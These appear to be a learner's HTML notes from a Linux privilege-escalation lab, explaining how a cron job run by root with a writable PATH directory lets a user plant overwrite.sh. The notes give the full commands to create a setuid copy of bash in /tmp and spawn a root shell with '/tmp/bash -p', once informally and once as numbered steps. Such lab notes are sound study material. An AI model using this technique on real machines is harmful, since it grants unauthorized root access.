<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Cron Paths</title>
</head><body><b>Escalation via Cron Paths</b><br/>
<br/>
<br/>
Search by catting out crontable<br/>
<br/>
<br/>
cat /etc/crontab<br/>
<br/>
<br/>
<img height="331" src="image.png" width="750"/><br/>
<br/>
Lots of info.<br/>
<br/>
Chekc path.. its first checking in /home/user. tahts good.<br/>
<br/>
the tasks being run (by root) are overwrite and comrpess.<br/>
<br/>
The key difference is overwrite is not being directly called like compress. this means we can check for and potentailly modify or insert overwrite.sh into home user and escalate.<br/>
<br/>
check if its there<br/>
<br/>
<b>ls -la</b><br/>
<br/>
not there./ perfect create own<br/>
<br/>
one liner<br/>
<br/>
syntax &gt; <b>echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt; /home/user/overwrite.sh</b><br/>
<br/>
Then <b>chmod+x /home/user/overwrite.sh<br/>
</b><br/>
ls -la and check its there... <br/>
<br/>
take not of the time modified.<br/>
<br/>
check back in a few minutes note that the time mopdifed has changed<br/>
<br/>
run it<br/>
<br/>
<b>/tmp/bash -p</b><br/>
<br/>
<img height="94" src="image 2.png" width="650"/><br/>
<br/>
<br/>
<br/>
<br/>
<br/>
Detection<br/>
<br/>
Linux VM<br/>
<br/>
1. In command prompt type: cat /etc/crontab<br/>
2. From the output, notice the value of the “PATH” variable.<br/>
<br/>
Exploitation<br/>
<br/>
Linux VM<br/>
<br/>
1. In command prompt type:<br/>
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt; /home/user/overwrite.sh<br/>
2. In command prompt type: chmod +x /home/user/overwrite.sh<br/>
3. Wait 1 minute for the Bash script to execute.<br/>
4. In command prompt type: /tmp/bash -p<br/>
5. In command prompt type: id<br/>
<br/>
<br/>
<br/>
<br/>
</body></html>